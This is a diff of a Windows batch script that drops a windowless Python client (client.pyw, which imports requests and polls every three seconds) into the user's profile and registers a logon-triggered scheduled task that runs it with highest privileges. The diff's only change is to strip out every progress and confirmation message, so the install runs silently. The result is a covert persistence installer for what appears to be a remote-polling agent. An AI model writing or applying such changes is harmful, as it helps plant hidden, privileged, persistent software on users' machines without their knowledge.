@@ -4,11 +4,11 @@ setlocal
 :: Define the target directory as the current user's profile directory
 set "TARGET_DIR=%USERPROFILE%"
 
-echo Target directory is: %TARGET_DIR%
+
 
 :: The user's profile directory should always exist, so no need to create it.
 echo.
-echo Creating client.pyw in %TARGET_DIR%...
+
 
 :: Create client.pyw in the target directory
 echo import requests > "%TARGET_DIR%\client.pyw"
@@ -79,23 +79,23 @@ echo             pass >> "%TARGET_DIR%\client.pyw"
 echo. >> "%TARGET_DIR%\client.pyw"
 echo         time.sleep(3) >> "%TARGET_DIR%\client.pyw"
 
-echo client.pyw created successfully!
+
 
 :: Create onstart.bat to run client.pyw
 echo.
-echo Creating onstart.bat in %TARGET_DIR%...
+
 echo @echo off > "%TARGET_DIR%\onstart.bat"
 echo start "" "%TARGET_DIR%\client.pyw" >> "%TARGET_DIR%\onstart.bat"
 
-echo onstart.bat created successfully!
+
 
 :: Create or update the startup task
 echo.
-echo Creating startup task...
+
 schtasks /create /tn "OnStart" /tr "%TARGET_DIR%\onstart.bat" /sc ONLOGON /rl HIGHEST /f
 echo.
-echo Task "OnStart" has been created or updated to run on startup.
-echo This script should be run as an Administrator.
+
+
 echo.
 call "%TARGET_DIR%\onstart.bat"
 pause
